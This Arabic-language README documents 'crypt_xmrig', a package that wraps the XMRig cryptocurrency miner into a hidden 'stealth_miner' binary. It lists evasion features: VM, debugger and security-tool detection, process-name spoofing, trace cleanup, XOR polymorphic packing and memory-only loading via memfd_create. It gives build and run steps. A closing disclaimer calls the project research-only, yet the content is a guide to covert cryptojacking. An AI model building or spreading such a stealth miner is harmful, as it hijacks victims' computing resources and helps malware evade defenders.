# 🥷 crypt_xmrig - Complete XMRig Stealth Package

مجلد متكامل لتشفير ودمج XMRig مع تقنيات الإخفاء المتقدمة.

## 📁 محتويات المجلد

```
crypt xmrig/
├── crypt_xmrig.sh      # السكريبت الرئيسي للدمج
├── main.cpp            # الملف الرئيسي للبرنامج
├── evasion_monitor.h   # تعريفات نظام التمويه
├── evasion_monitor.cpp # تنفيذ نظام التمويه المتقدم
├── binary_embedder.h   # تعريفات نظام التضمين
├── config.json         # إعدادات XMRig الافتراضية
├── README.md          # هذا الملف
└── xmrig              # ضع ملف XMRig هنا
```

## 🚀 الاستخدام

### 1. تحضير الملفات
```bash
# ضع ملف XMRig في هذا المجلد
cp /path/to/your/xmrig ./

# تأكد من صلاحيات التنفيذ
chmod +x crypt_xmrig.sh
chmod +x xmrig
```

### 2. تشغيل عملية الدمج
```bash
./crypt_xmrig.sh
```

### 3. تشغيل النتيجة
```bash
cd output
./stealth_miner
```

## 🛡️ المزايا المدمجة

### **نظام الإخفاء المتقدم:**
- ✅ كشف البيئات الافتراضية (VMware, VirtualBox, QEMU)
- ✅ كشف أدوات الأمان (+30 أداة)
- ✅ كشف المحللين والـ Debuggers
- ✅ كشف مراقبة الشبكة
- ✅ تمويه اسم العملية
- ✅ تنظيف الآثار التلقائي

### **نظام التضمين:**
- ✅ XMRig مدمج في الذاكرة (memfd)
- ✅ Config.json مدمج
- ✅ أسماء ملفات عشوائية
- ✅ تنظيف تلقائي للملفات المؤقتة
-   ✓ Polymorphic packer: تشفير XOR ديناميكي للبلايناري
-   ✓ ضغط Binary باستخدام zlib لتقليل الآثار والسلاسل الثابتة
-   ✓ فك التشفير وفك الضغط في الذاكرة دون لمس القرص
-   ✓ أسماء رمزية عشوائية للمتغيرات والرموز المدمجة

### **تقنيات المقاومة:**
- ✅ Anti-debugging (ptrace detection)
- ✅ Anti-VM techniques
- ✅ Process name spoofing
- ✅ Low priority execution
- ✅ Adaptive behavior
-   ✓ Memory-only loading via memfd_create (no disk writes)
-   ✓ RDTSC-based VM timing detection
-   ✓ Promiscuous mode detection across all network interfaces

## ⚙️ تحسين نظام التضمين
```cpp
// في binary_embedder.cpp:
// - embedded_xmrig_encrypted[]: مصفوفة البايناري المشفرة بـ XOR
// - xor_key[]: مفتاح عشوائي يُولد عند build
// - استخدم zlib لفك الضغط بعد XOR في الذاكرة (memfd)
```

## ⚙️ تخصيص الإعدادات

### تعديل آليات VM والواجهة الشبكية:
```cpp
// في evasion_monitor.cpp:
// - checkVMIndicators(): تمت إضافة فحص RDTSC للكشف عن VM
// - isNetworkMonitored(): تمت تهيئة فحص promiscuous mode لأجل جميع الواجهات
```

### تعديل إعدادات XMRig:
```bash
# عدل config.json قبل تشغيل crypt_xmrig.sh
nano config.json
```

### إضافة أدوات أمان جديدة للكشف:
```cpp
// في evasion_monitor.cpp, عدل دالة getSecurityProcessList()
```

## 🔧 متطلبات النظام

- **النظام:** Linux Ubuntu 18.04+
- **المترجم:** GCC مع دعم C++11
- **الأدوات:** xxd, sed, awk
- **الصلاحيات:** إمكانية الكتابة في /tmp

## ⚠️ تنبيهات مهمة

1. **لأغراض البحث فقط:** هذا المشروع للبحث الأمني والتعليم
2. **بيئة معزولة:** استخدم في بيئة آمنة معزولة
3. **لا تعدين حقيقي:** الكود للمحاكاة وليس للتعدين الفعلي

## 📊 إحصائيات الأداء

- **حجم الكود:** ~2MB قبل الدمج
- **حجم XMRig:** ~6-8MB عادة
- **الحجم النهائي:** ~8-10MB
- **وقت البناء:** 10-30 ثانية
- **استهلاك الذاكرة:** ~50MB أثناء التشغيل

---

**تم تطويره لأغراض البحث الأمني** 🔒
